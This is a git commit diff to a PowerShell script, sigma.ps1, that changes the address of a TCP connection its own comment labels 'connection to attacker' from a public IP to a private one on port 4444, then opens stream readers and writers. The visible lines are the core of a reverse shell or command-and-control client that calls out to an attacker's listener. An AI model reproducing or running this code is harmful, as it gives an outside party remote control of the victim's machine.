ceff944052a62baae3c34dc686a976d8ebb6847c
BellaTheUni112 <bellatheunicorn521@gmail.com>
2025-07-06 22:08:56 +0100

    Update sigma.ps1

--- sigma.ps1
+++ sigma.ps1
@@ -14,7 +14,7 @@ public class WinAPI {
 }
 
 # Setup TCP connection to attacker
-$client = New-Object System.Net.Sockets.TcpClient("51.9.181.57", 4444)
+$client = New-Object System.Net.Sockets.TcpClient("192.168.1.134", 4444)
 $stream = $client.GetStream()
 $reader = New-Object System.IO.StreamReader($stream)
 $writer = New-Object System.IO.StreamWriter($stream)
